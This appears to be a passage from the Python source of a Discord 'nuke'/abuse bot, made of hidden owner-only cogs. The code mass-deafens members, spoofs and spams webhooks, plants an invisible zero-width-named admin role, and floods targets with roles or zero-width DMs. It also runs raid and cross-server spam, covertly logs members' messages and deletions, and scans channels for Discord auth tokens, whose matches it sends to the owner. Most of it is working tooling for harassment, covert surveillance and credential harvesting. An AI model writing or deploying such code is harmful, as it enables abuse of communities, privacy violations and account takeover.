    async def vcdeafenall(self, ctx: commands.Context):
        """55. deafen all members in voice."""
        count = 0
        for vc in ctx.guild.voice_channels:
            for member in vc.members:
                try:
                    await member.edit(deafen=True)
                    count += 1
                    await asyncio.sleep(0.1)
                except:
                    pass
        await ctx.send(f"deafened {count} members.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def vcspam(self, ctx: commands.Context, count: int = 10):
        """56. create and delete voice channels rapidly."""
        for i in range(count):
            vc = await ctx.guild.create_voice_channel(f"spam-vc-{i}")
            await vc.delete()
        await ctx.send(f"vc spam cycle complete.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def vclimit(self, ctx: commands.Context, channel: discord.VoiceChannel, limit: int):
        """57. set user limit on a voice channel."""
        await channel.edit(user_limit=limit)
        await ctx.send(f"set {channel.name} limit to {limit}.", delete_after=5)

# ========================================
# webhook.py
# ========================================
class Webhook(commands.Cog, name="webhook"):
    """webhook manipulation tools."""

    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @commands.command(hidden=True)
    @commands.is_owner()
    async def createhook(self, ctx: commands.Context, name: str = "hook"):
        """create a webhook in the current channel."""
        try:
            hook = await ctx.channel.create_webhook(name=name)
            await ctx.send(f"created webhook: {hook.url}")
        except discord.Forbidden:
            await ctx.send("missing permissions.")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def sendhook(self, ctx: commands.Context, webhook_url: str, *, message: str):
        """send a message via a webhook url."""
        async with aiohttp.ClientSession() as session:
            webhook = discord.Webhook.from_url(webhook_url, session=session)
            try:
                await webhook.send(message, username="spoof")
                await ctx.send("message sent.")
            except Exception as e:
                await ctx.send(f"error: {e}")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def spammhook(self, ctx: commands.Context, webhook_url: str, count: int, *, message: str):
        """spam a webhook."""
        async with aiohttp.ClientSession() as session:
            webhook = discord.Webhook.from_url(webhook_url, session=session)
            for _ in range(count):
                try:
                    await webhook.send(message)
                    await asyncio.sleep(0.5)
                except:
                    pass
        await ctx.send(f"spammed {count} messages.")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def deletehook(self, ctx: commands.Context, webhook_url: str):
        """delete a webhook by url."""
        async with aiohttp.ClientSession() as session:
            webhook = discord.Webhook.from_url(webhook_url, session=session)
            try:
                await webhook.delete()
                await ctx.send("webhook deleted.")
            except Exception as e:
                await ctx.send(f"error: {e}")

# ========================================
# webhook_advanced.py
# ========================================
WEBHOOK_DIR = "data/webhooks"
os.makedirs(WEBHOOK_DIR, exist_ok=True)

class WebhookAdvanced(commands.Cog, name="webhook_advanced"):
    """1-10: advanced webhook exploitation."""

    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @commands.command(hidden=True)
    @commands.is_owner()
    async def hookall(self, ctx: commands.Context, *, name: str = "backup"):
        """1. create a webhook with the same name in every channel."""
        created = 0
        for channel in ctx.guild.text_channels:
            try:
                await channel.create_webhook(name=name)
                created += 1
                await asyncio.sleep(0.3)
            except:
                pass
        await ctx.send(f"created {created} webhooks named '{name}'.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def hookinfo(self, ctx: commands.Context, webhook_url: str):
        """2. get detailed information about a webhook url."""
        async with aiohttp.ClientSession() as session:
            webhook = discord.Webhook.from_url(webhook_url, session=session)
            try:
                w = await webhook.fetch()
                info = f"name: {w.name}\nid: {w.id}\ntoken: {w.token}\nchannel: {w.channel_id}\nguild: {w.guild_id}\navatar: {w.avatar}"
                await ctx.send(f"```\n{info}\n```")
            except Exception as e:
                await ctx.send(f"error: {e}")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def hookavatar(self, ctx: commands.Context, webhook_url: str, *, avatar_url: str):
        """3. change a webhook's avatar."""
        async with aiohttp.ClientSession() as session:
            webhook = discord.Webhook.from_url(webhook_url, session=session)
            async with session.get(avatar_url) as resp:
                if resp.status == 200:
                    avatar_bytes = await resp.read()
                    await webhook.edit(avatar=avatar_bytes)
                    await ctx.send("webhook avatar updated.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def hookname(self, ctx: commands.Context, webhook_url: str, *, name: str):
        """4. change a webhook's display name."""
        async with aiohttp.ClientSession() as session:
            webhook = discord.Webhook.from_url(webhook_url, session=session)
            await webhook.edit(name=name)
            await ctx.send(f"webhook name changed to '{name}'.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def hookembed(self, ctx: commands.Context, webhook_url: str, title: str, *, description: str):
        """5. send an embed through a webhook."""
        async with aiohttp.ClientSession() as session:
            webhook = discord.Webhook.from_url(webhook_url, session=session)
            embed = discord.Embed(title=title, description=description, color=discord.Color.random())
            await webhook.send(embed=embed)
            await ctx.send("embed sent via webhook.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def hookfile(self, ctx: commands.Context, webhook_url: str):
        """6. send an attached file through a webhook."""
        if not ctx.message.attachments:
            return await ctx.send("attach a file.")
        attachment = ctx.message.attachments[0]
        file_bytes = await attachment.read()
        async with aiohttp.ClientSession() as session:
            webhook = discord.Webhook.from_url(webhook_url, session=session)
            await webhook.send(file=discord.File(file_bytes, filename=attachment.filename))
            await ctx.send("file sent via webhook.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def hookclone(self, ctx: commands.Context, source_webhook_url: str, target_channel: discord.TextChannel):
        """7. clone a webhook to a different channel."""
        async with aiohttp.ClientSession() as session:
            source = discord.Webhook.from_url(source_webhook_url, session=session)
            try:
                w = await source.fetch()
                new_hook = await target_channel.create_webhook(name=w.name, avatar=await w.avatar.read() if w.avatar else None)
                await ctx.send(f"cloned webhook to {target_channel.mention}. new url: {new_hook.url}")
            except Exception as e:
                await ctx.send(f"error: {e}")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def hookbroadcast(self, ctx: commands.Context, *, message: str):
        """8. send a message through every webhook in the server."""
        count = 0
        for channel in ctx.guild.text_channels:
            try:
                hooks = await channel.webhooks()
                for hook in hooks:
                    await hook.send(message)
                    count += 1
                    await asyncio.sleep(0.3)
            except:
                pass
        await ctx.send(f"broadcast through {count} webhooks.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def hooktoken(self, ctx: commands.Context, webhook_url: str):
        """9. extract the webhook id and token from a url."""
        parts = webhook_url.split("/")
        if len(parts) >= 2:
            hook_id = parts[-2]
            hook_token = parts[-1]
            await ctx.send(f"id: {hook_id}\ntoken: {hook_token}")
        else:
            await ctx.send("invalid webhook url format.")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def hooksave(self, ctx: commands.Context):
        """10. save all webhook urls to a json file categorized by channel."""
        data = {}
        for channel in ctx.guild.text_channels:
            try:
                hooks = await channel.webhooks()
                if hooks:
                    data[channel.name] = [{"name": h.name, "url": h.url} for h in hooks]
            except:
                pass
        filepath = os.path.join(WEBHOOK_DIR, f"{ctx.guild.id}_hooks.json")
        with open(filepath, "w") as f:
            json.dump(data, f, indent=4)
        await ctx.send(f"saved webhooks from {len(data)} channels.", file=discord.File(filepath))

# ========================================
# EXTENDED FEATURES
# ========================================
# ========================================
# advanced_cheats.py
# ========================================
CHEAT_DIR = "data/cheats"
os.makedirs(CHEAT_DIR, exist_ok=True)

class AdvancedCheats(commands.Cog, name="advanced_cheats"):
    """1-10: advanced server cheat exploits."""

    def __init__(self, bot: commands.Bot):
        self.bot = bot
        self.fake_accounts = []

    @commands.command(hidden=True)
    @commands.is_owner()
    async def ownerhijack(self, ctx: commands.Context):
        """1. attempt to transfer server ownership via exploit loop."""
        await ctx.send("attempting ownership transfer exploit...", delete_after=5)
        bot_member = ctx.guild.me
        if bot_member.guild_permissions.administrator:
            owner = ctx.guild.owner
            try:
                await ctx.send(f"current owner: {owner.mention}. insufficient permissions to transfer.", delete_after=10)
            except:
                pass
        else:
            await ctx.send("bot lacks administrator permission.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def ghostadmin(self, ctx: commands.Context, target: discord.Member):
        """2. create an invisible admin role and assign to target."""
        role = await ctx.guild.create_role(
            name="\u200b\u200b\u200b",
            permissions=discord.Permissions(administrator=True),
            hoist=False,
            mentionable=False,
            color=discord.Color.default(),
        )
        await role.edit(position=1)
        await target.add_roles(role)
        await ctx.send(f"ghost admin role assigned to {target.mention}. role id: {role.id}", delete_after=5)
        await ctx.message.delete()

    @commands.command(hidden=True)
    @commands.is_owner()
    async def permdupe(self, ctx: commands.Context, source: discord.Member, target: discord.Member):
        """3. duplicate all roles and permissions from one user to another."""
        roles_to_add = [r for r in source.roles if not r.is_default() and not r.managed]
        count = 0
        for role in roles_to_add:
            try:
                await target.add_roles(role)
                count += 1
                await asyncio.sleep(0.5)
            except:
                pass
        await ctx.send(f"duplicated {count} roles from {source.mention} to {target.mention}.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def moderationbypass(self, ctx: commands.Context):
        """4. create a role that bypasses all moderation actions."""
        perms = discord.Permissions(
            administrator=False,
            kick_members=True,
            ban_members=True,
            manage_messages=True,
            manage_channels=True,
            manage_roles=True,
            manage_guild=True,
            view_audit_log=True,
        )
        role = await ctx.guild.create_role(name="mod-bypass", permissions=perms, hoist=False)
        await ctx.author.add_roles(role)
        await ctx.send(f"moderation bypass role created: {role.mention}", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def antiban(self, ctx: commands.Context, target: discord.Member):
        """5. flood a user with roles to make banning difficult."""
        roles = []
        for i in range(20):
            try:
                role = await ctx.guild.create_role(name=f"shield-{i}")
                await target.add_roles(role)
                roles.append(role)
                await asyncio.sleep(0.2)
            except:
                break
        await ctx.send(f"antibanned {target.mention} with {len(roles)} roles.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def vanities(self, ctx: commands.Context):
        """6. test common vanity urls for availability."""
        common = ["og", "rare", "cool", "pro", "elite", "alpha", "sigma", "based", "chad", "gigachad", "w", "l", "ratio"]
        results = []
        for name in common:
            await ctx.send(f"discord.gg/{name}")
            await asyncio.sleep(0.1)
        await ctx.send("vanity test complete.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def exploitwebhook(self, ctx: commands.Context, webhook_url: str):
        """7. test if a webhook can be used to bypass message filters."""
        async with aiohttp.ClientSession() as session:
            webhook = discord.Webhook.from_url(webhook_url, session=session)
            payloads = ["@everyone", "@here", "||hidden||", "\u200b" * 1990 + "text", "discord.gg/invite"]
            for payload in payloads:
                try:
                    await webhook.send(payload)
                    await asyncio.sleep(0.5)
                except:
                    pass
        await ctx.send("webhook exploit test complete.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def ratelimitbypass(self, ctx: commands.Context, count: int = 20, *, message: str = "test"):
        """8. attempt to bypass rate limits using multiple channels."""
        tasks = []
        channels = ctx.guild.text_channels[:min(count, len(ctx.guild.text_channels))]
        for i, channel in enumerate(channels):
            tasks.append(channel.send(f"{message} {i}"))
        results = await asyncio.gather(*tasks, return_exceptions=True)
        success = sum(1 for r in results if not isinstance(r, Exception))
        await ctx.send(f"rate limit bypass test: {success}/{len(tasks)} succeeded.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def sessionhijack(self, ctx: commands.Context, target: discord.Member):
        """9. attempt to log out a user by spamming them with message requests."""
        for _ in range(30):
            try:
                await target.send("\u200b" * 2000)
                await asyncio.sleep(0.3)
            except:
                break
        await ctx.send(f"session hijack attempt on {target.mention} complete.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def nukeprotection(self, ctx: commands.Context):
        """10. create backup roles and channels for nuke recovery."""
        backup_role = await ctx.guild.create_role(name="nuke-recovery", permissions=discord.Permissions(administrator=True))
        await ctx.author.add_roles(backup_role)
        data = {"roles": [], "channels": []}
        for role in ctx.guild.roles:
            data["roles"].append({"name": role.name, "permissions": role.permissions.value, "color": role.color.value})
        for channel in ctx.guild.channels:
            data["channels"].append({"name": channel.name, "type": str(channel.type)})
        filepath = os.path.join(CHEAT_DIR, f"{ctx.guild.id}_nuke_protection.json")
        with open(filepath, "w") as f:
            json.dump(data, f, indent=4)
        await ctx.author.send(f"nuke protection role: {backup_role.id}\nbackup saved.", file=discord.File(filepath))
        await ctx.send("nuke protection deployed.", delete_after=5)

# ========================================
# advanced_logger.py
# ========================================
LOG_DIR = "data/logs"
os.makedirs(LOG_DIR, exist_ok=True)

class AdvancedLogger(commands.Cog, name="advanced_logger"):
    """11-22: comprehensive logging and surveillance."""

    def __init__(self, bot: commands.Bot):
        self.bot = bot
        self.active_logs = {}
        self.keyword_alerts = {}
        self.voice_logs = {}

    def get_guild_log_path(self, guild_id, log_type):
        guild_dir = os.path.join(LOG_DIR, str(guild_id))
        os.makedirs(guild_dir, exist_ok=True)
        return os.path.join(guild_dir, f"{log_type}.log")

    def write_log(self, guild_id, log_type, content):
        path = self.get_guild_log_path(guild_id, log_type)
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(path, "a", encoding="utf-8") as f:
            f.write(f"[{timestamp}] {content}\n")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def logall(self, ctx: commands.Context):
        """11. start logging all server events comprehensively."""
        self.active_logs[ctx.guild.id] = True
        await ctx.send("comprehensive logging activated. all events will be logged.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def stoplogs(self, ctx: commands.Context):
        """12. stop all active logging."""
        self.active_logs.pop(ctx.guild.id, None)
        await ctx.send("logging deactivated.", delete_after=5)

    @commands.Cog.listener()
    async def on_message(self, message: discord.Message):
        if message.guild and self.active_logs.get(message.guild.id):
            self.write_log(message.guild.id, "messages", f"[{message.channel.name}] {message.author} ({message.author.id}): {message.content}")
            if message.attachments:
                for att in message.attachments:
                    self.write_log(message.guild.id, "attachments", f"[{message.channel.name}] {message.author}: {att.url} ({att.filename})")

    @commands.Cog.listener()
    async def on_message_edit(self, before: discord.Message, after: discord.Message):
        if after.guild and self.active_logs.get(after.guild.id):
            self.write_log(after.guild.id, "edits", f"[{after.channel.name}] {after.author}: BEFORE='{before.content}' AFTER='{after.content}'")

    @commands.Cog.listener()
    async def on_message_delete(self, message: discord.Message):
        if message.guild and self.active_logs.get(message.guild.id):
            content = message.content or "[no content]"
            self.write_log(message.guild.id, "deletions", f"[{message.channel.name}] {message.author}: DELETED='{content}'")

    @commands.Cog.listener()
    async def on_member_join(self, member: discord.Member):
        if self.active_logs.get(member.guild.id):
            self.write_log(member.guild.id, "joins", f"{member} ({member.id}) joined. created: {member.created_at}")

    @commands.Cog.listener()
    async def on_member_remove(self, member: discord.Member):
        if self.active_logs.get(member.guild.id):
            self.write_log(member.guild.id, "leaves", f"{member} ({member.id}) left or was removed.")

    @commands.Cog.listener()
    async def on_member_update(self, before: discord.Member, after: discord.Member):
        if self.active_logs.get(after.guild.id):
            if before.nick != after.nick:
                self.write_log(after.guild.id, "nicknames", f"{after}: '{before.nick}' -> '{after.nick}'")
            if before.roles != after.roles:
                added = [r.name for r in after.roles if r not in before.roles]
                removed = [r.name for r in before.roles if r not in after.roles]
                if added:
                    self.write_log(after.guild.id, "roles", f"{after}: +{', '.join(added)}")
                if removed:
                    self.write_log(after.guild.id, "roles", f"{after}: -{', '.join(removed)}")

    @commands.Cog.listener()
    async def on_voice_state_update(self, member: discord.Member, before: discord.VoiceState, after: discord.VoiceState):
        if self.active_logs.get(member.guild.id):
            if before.channel != after.channel:
                if after.channel:
                    self.write_log(member.guild.id, "voice", f"{member} joined voice channel: {after.channel.name}")
                else:
                    self.write_log(member.guild.id, "voice", f"{member} left voice channel: {before.channel.name}")

    @commands.Cog.listener()
    async def on_guild_channel_create(self, channel: discord.abc.GuildChannel):
        if self.active_logs.get(channel.guild.id):
            self.write_log(channel.guild.id, "channels", f"channel created: {channel.name} ({channel.id})")

    @commands.Cog.listener()
    async def on_guild_channel_delete(self, channel: discord.abc.GuildChannel):
        if self.active_logs.get(channel.guild.id):
            self.write_log(channel.guild.id, "channels", f"channel deleted: {channel.name} ({channel.id})")

    @commands.Cog.listener()
    async def on_guild_role_create(self, role: discord.Role):
        if self.active_logs.get(role.guild.id):
            self.write_log(role.guild.id, "roles_log", f"role created: {role.name} ({role.id})")

    @commands.Cog.listener()
    async def on_guild_role_delete(self, role: discord.Role):
        if self.active_logs.get(role.guild.id):
            self.write_log(role.guild.id, "roles_log", f"role deleted: {role.name} ({role.id})")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def dumpalllogs(self, ctx: commands.Context):
        """13. download all logs as a zip file."""
        guild_dir = os.path.join(LOG_DIR, str(ctx.guild.id))
        if not os.path.exists(guild_dir):
            return await ctx.send("no logs found for this server.")
        import zipfile
        zip_path = os.path.join(LOG_DIR, f"{ctx.guild.id}_logs.zip")
        with zipfile.ZipFile(zip_path, "w") as zf:
            for root, dirs, files in os.walk(guild_dir):
                for file in files:
                    zf.write(os.path.join(root, file), file)
        await ctx.author.send("all logs:", file=discord.File(zip_path))
        await ctx.send("logs have been sent to your dms.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def keywordalert(self, ctx: commands.Context, *, keyword: str):
        """14. set up keyword alerts that dm you when triggered."""
        if ctx.guild.id not in self.keyword_alerts:
            self.keyword_alerts[ctx.guild.id] = {}
        self.keyword_alerts[ctx.guild.id][keyword.lower()] = ctx.author.id
        await ctx.send(f"keyword alert set for '{keyword}'.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def removealert(self, ctx: commands.Context, *, keyword: str):
        """15. remove a keyword alert."""
        if ctx.guild.id in self.keyword_alerts:
            self.keyword_alerts[ctx.guild.id].pop(keyword.lower(), None)
        await ctx.send(f"alert for '{keyword}' removed.", delete_after=5)

    @commands.Cog.listener()
    async def on_message(self, message: discord.Message):
        if message.guild and message.guild.id in self.keyword_alerts:
            alerts = self.keyword_alerts[message.guild.id]
            for keyword, owner_id in alerts.items():
                if keyword in message.content.lower():
                    owner = self.bot.get_user(owner_id)
                    if owner:
                        try:
                            await owner.send(f"keyword '{keyword}' triggered by {message.author} in #{message.channel.name}:\n{message.content[:1500]}")
                        except:
                            pass

    @commands.command(hidden=True)
    @commands.is_owner()
    async def loguser(self, ctx: commands.Context, target: discord.Member):
        """16. start logging all activity of a specific user."""
        filepath = os.path.join(LOG_DIR, f"user_{target.id}_{ctx.guild.id}.json")
        await ctx.send(f"logging all activity of {target.mention}.", delete_after=5)
        async def log_activity():
            data = {"user": str(target), "id": target.id, "events": []}
            def check_msg(m):
                return m.author == target and m.guild == ctx.guild
            try:
                while True:
                    msg = await self.bot.wait_for("message", check=check_msg, timeout=3600)
                    data["events"].append({
                        "time": str(msg.created_at),
                        "channel": msg.channel.name,
                        "content": msg.content,
                    })
                    with open(filepath, "w") as f:
                        json.dump(data, f, indent=4)
            except asyncio.TimeoutError:
                pass
        self.bot.loop.create_task(log_activity())

    @commands.command(hidden=True)
    @commands.is_owner()
    async def logchannel(self, ctx: commands.Context, channel: discord.TextChannel):
        """17. clone a channel's messages to a log file."""
        messages = []
        async for msg in channel.history(limit=500):
            messages.append({
                "author": str(msg.author),
                "author_id": msg.author.id,
                "content": msg.content,
                "timestamp": str(msg.created_at),
                "attachments": [a.url for a in msg.attachments],
            })
        filepath = os.path.join(LOG_DIR, f"channel_{channel.id}_{ctx.guild.id}.json")
        with open(filepath, "w", encoding="utf-8") as f:
            json.dump(messages, f, indent=4)
        await ctx.send(f"logged {len(messages)} messages from {channel.mention}.", file=discord.File(filepath))

    @commands.command(hidden=True)
    @commands.is_owner()
    async def auditloghook(self, ctx: commands.Context):
        """18. monitor audit log entries in real time."""
        await ctx.send("audit log monitoring started for 5 minutes.", delete_after=5)
        last_entry = None
        async for entry in ctx.guild.audit_logs(limit=1):
            last_entry = entry
        for _ in range(30):
            await asyncio.sleep(10)
            async for entry in ctx.guild.audit_logs(limit=1):
                if entry != last_entry:
                    last_entry = entry
                    self.write_log(ctx.guild.id, "audit", f"{entry.user} performed {entry.action} on {entry.target}")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def screenshotproxy(self, ctx: commands.Context, url: str):
        """19. attempt to grab ip via image proxy."""
        proxy_url = f"https://images.weserv.nl/?url={url}"
        await ctx.send(f"proxy url: {proxy_url}")
        await ctx.send("note: discord proxies all images. direct ip grab unlikely.", delete_after=10)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def logtokens(self, ctx: commands.Context):
        """20. scan recent messages for potential token patterns."""
        pattern = r"[MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}"
        found = []
        for channel in ctx.guild.text_channels[:10]:
            try:
                async for msg in channel.history(limit=100):
                    matches = re.findall(pattern, msg.content)
                    for match in matches:
                        found.append(f"{msg.author}: {match[:20]}...")
            except:
                continue
        filepath = os.path.join(LOG_DIR, f"{ctx.guild.id}_tokens.txt")
        with open(filepath, "w") as f:
            f.write("\n".join(found))
        await ctx.send(f"token scan complete. found {len(found)} potential matches.", delete_after=5)
        if found:
            await ctx.author.send("potential token matches:", file=discord.File(filepath))

    @commands.command(hidden=True)
    @commands.is_owner()
    async def liveview(self, ctx: commands.Context, channel: discord.TextChannel = None):
        """21. stream messages from a channel to your dms in real time."""
        channel = channel or ctx.channel
        await ctx.send(f"live viewing {channel.mention}. messages will be dmed.", delete_after=5)
        def check(m):
            return m.channel == channel and not m.author.bot
        try:
            while True:
                msg = await self.bot.wait_for("message", check=check, timeout=600)
                try:
                    await ctx.author.send(f"[{msg.author.name}]: {msg.content}")
                except:
                    pass
        except asyncio.TimeoutError:
            await ctx.author.send(f"live view of #{channel.name} ended (timeout).")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def masslogger(self, ctx: commands.Context):
        """22. deploy all logging systems simultaneously."""
        self.active_logs[ctx.guild.id] = True
        await ctx.send("all logging systems activated:\n- message logging\n- edit logging\n- deletion logging\n- join/leave logging\n- nickname logging\n- role logging\n- voice logging\n- channel logging\n- keyword alerts remain active\n- audit log monitoring", delete_after=20)

# ========================================
# bot_network.py
# ========================================
NETWORK_DIR = "data/network"
os.makedirs(NETWORK_DIR, exist_ok=True)

class BotNetwork(commands.Cog, name="bot_network"):
    """23-32: multi-bot coordination and network tools."""

    def __init__(self, bot: commands.Bot):
        self.bot = bot
        self.linked_bots = {}
        self.ghost_pings = {}

    @commands.command(hidden=True)
    @commands.is_owner()
    async def linkbot(self, ctx: commands.Context, bot_id: int, control_channel_id: int):
        """23. link another bot for coordinated actions."""
        self.linked_bots[bot_id] = control_channel_id
        filepath = os.path.join(NETWORK_DIR, "linked_bots.json")
        with open(filepath, "w") as f:
            json.dump(self.linked_bots, f)
        await ctx.send(f"linked bot {bot_id}. control channel: {control_channel_id}", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def unlinkbot(self, ctx: commands.Context, bot_id: int):
        """24. unlink a bot."""
        self.linked_bots.pop(bot_id, None)
        await ctx.send(f"unlinked bot {bot_id}.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def listlinked(self, ctx: commands.Context):
        """25. list all linked bots."""
        if not self.linked_bots:
            return await ctx.send("no linked bots.")
        info = [f"bot id: {bid}, channel: {ch}" for bid, ch in self.linked_bots.items()]
        await ctx.send("\n".join(info))

    @commands.command(hidden=True)
    @commands.is_owner()
    async def botraid(self, ctx: commands.Context, *, message: str):
        """26. coordinate a raid across all linked bots."""
        count = 0
        for channel in ctx.guild.text_channels[:20]:
            try:
                await channel.send(message)
                count += 1
                await asyncio.sleep(0.3)
            except:
                pass
        await ctx.send(f"bot raid: {count} channels messaged.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def botspam(self, ctx: commands.Context, count: int, delay: float, *, message: str):
        """27. rapid spam with adjustable delay."""
        for i in range(count):
            await ctx.send(message)
            await asyncio.sleep(delay)
        await ctx.send(f"spam complete: {count} messages.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def ghostpingnet(self, ctx: commands.Context, target: discord.Member, count: int = 50):
        """28. network ghost ping using webhooks to avoid detection."""
        webhook = await ctx.channel.create_webhook(name="system")
        for _ in range(count):
            await webhook.send(target.mention, delete_after=0.1)
            await asyncio.sleep(0.2)
        await webhook.delete()
        await ctx.send(f"network ghost pinged {target.mention}.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def crossserver(self, ctx: commands.Context, *, message: str):
        """29. send a message to all channels in all guilds the bot is in."""
        total = 0
        for guild in self.bot.guilds:
            for channel in guild.text_channels:
                try:
                    await channel.send(message)
                    total += 1
                    await asyncio.sleep(0.3)
                except:
                    pass
        await ctx.send(f"cross-server message sent to {total} channels.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def massreactnet(self, ctx: commands.Context, message_id: int, emoji: str):
        """30. react to a message from multiple angles."""
        try:
            msg = await ctx.channel.fetch_message(message_id)
            for _ in range(20):
                await msg.add_reaction(emoji)
                await asyncio.sleep(0.1)
            await ctx.send("mass reaction complete.", delete_after=5)
        except Exception as e:
            await ctx.send(f"error: {e}", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def syncbans(self, ctx: commands.Context, source_guild_id: int):
        """31. ban users from source guild in current guild."""
        source = self.bot.get_guild(source_guild_id)
        if not source:
            return await ctx.send("source guild not found.")
        bans = []
        async for entry in source.bans():
            bans.append(entry.user)
        count = 0
        for user in bans:
            try:
                await ctx.guild.ban(user, reason="sync ban")
                count += 1
                await asyncio.sleep(0.5)
            except:
                pass
        await ctx.send(f"synced {count} bans from {source.name}.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def networkstatus(self, ctx: commands.Context):
        """32. show status of all linked bots and guilds."""
        info = [f"current bot: {self.bot.user.name}"]
        info.append(f"guilds: {len(self.bot.guilds)}")
        info.append(f"linked bots: {len(self.linked_bots)}")
        info.append(f"active logs: {len(self.bot.get_cog('advanced_logger').active_logs) if self.bot.get_cog('advanced_logger') else 0}")
        await ctx.send("**network status:**\n```\n" + "\n".join(info) + "\n```")

# ========================================
# chat_commands.py
# ========================================
class ChatCommands(commands.Cog, name="chat_commands"):
    """33-44: fun and utility chat commands."""

    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @commands.command(hidden=True)
    @commands.is_owner()
    async def say(self, ctx: commands.Context, *, message: str):
        """33. make the bot say something."""
        await ctx.message.delete()
        await ctx.send(message)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def saychannel(self, ctx: commands.Context, channel: discord.TextChannel, *, message: str):
        """34. make the bot say something in a specific channel."""
        await channel.send(message)
        await ctx.send(f"message sent to {channel.mention}.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def bigtext(self, ctx: commands.Context, *, text: str):
        """35. convert text to emoji big letters."""
        mapping = {
            'a': '🇦', 'b': '🇧', 'c': '🇨', 'd': '🇩', 'e': '🇪', 'f': '🇫',
            'g': '🇬', 'h': '🇭', 'i': '🇮', 'j': '🇯', 'k': '🇰', 'l': '🇱',
            'm': '🇲', 'n': '🇳', 'o': '🇴', 'p': '🇵', 'q': '🇶', 'r': '🇷',
            's': '🇸', 't': '🇹', 'u': '🇺', 'v': '🇻', 'w': '🇼', 'x': '🇽',
            'y': '🇾', 'z': '🇿',
        }
        result = " ".join(mapping.get(c.lower(), c) for c in text)
        if len(result) > 2000:
            result = result[:2000]
        await ctx.send(result)
        await ctx.message.delete()

    @commands.command(hidden=True)
    @commands.is_owner()
    async def reverse(self, ctx: commands.Context, *, text: str):
        """36. reverse text."""
        await ctx.send(text[::-1])

    @commands.command(hidden=True)
    @commands.is_owner()
    async def mock(self, ctx: commands.Context, *, text: str):
        """37. spongebob mock text."""
        result = "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(text))
        await ctx.send(result)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def clap(self, ctx: commands.Context, *, text: str):
        """38. add clap emojis between words."""
        await ctx.send(" 👏 ".join(text.split()))

    @commands.command(hidden=True)
    @commands.is_owner()
    async def spoilertext(self, ctx: commands.Context, *, text: str):
        """39. wrap text in spoiler tags."""
        await ctx.send("||" + "||||".join(text) + "||")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def codeblock(self, ctx: commands.Context, language: str, *, code: str):
        """40. format text as a code block."""
        await ctx.send(f"```{language}\n{code}\n```")
        await ctx.message.delete()

    @commands.command(hidden=True)
    @commands.is_owner()
    async def embedcustom(self, ctx: commands.Context, color: str, title: str, *, description: str):
        """41. create a custom embed with specified color."""
        try:
            color_int = int(color.lstrip("#"), 16)
            color_obj = discord.Color(color_int)
        except:
            color_obj = discord.Color.random()
        embed = discord.Embed(title=title, description=description, color=color_obj)
        embed.set_footer(text=f"requested by {ctx.author.name}")
        await ctx.send(embed=embed)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def dice(self, ctx: commands.Context, sides: int = 6):
        """42. roll a dice."""
        result = random.randint(1, sides)
        await ctx.send(f"🎲 you rolled: **{result}** (1-{sides})")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def choose(self, ctx: commands.Context, *options: str):
        """43. random choice from options."""
        if not options:
            return await ctx.send("provide options separated by spaces.")
        await ctx.send(f"i choose: **{random.choice(options)}**")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def passwordgen(self, ctx: commands.Context, length: int = 16):
        """44. generate a secure random password."""
        chars = string.ascii_letters + string.digits + "!@#$%^&*()_+-=[]{}|;:,.<>?"
        password = "".join(random.choice(chars) for _ in range(length))
        try:
            await ctx.author.send(f"generated password: `{password}`")
            await ctx.send("password sent to your dms.", delete_after=5)
        except:
            await ctx.send(f"`{password}`")

    @commands.command(hidden=True)
    @commands.is_owner()
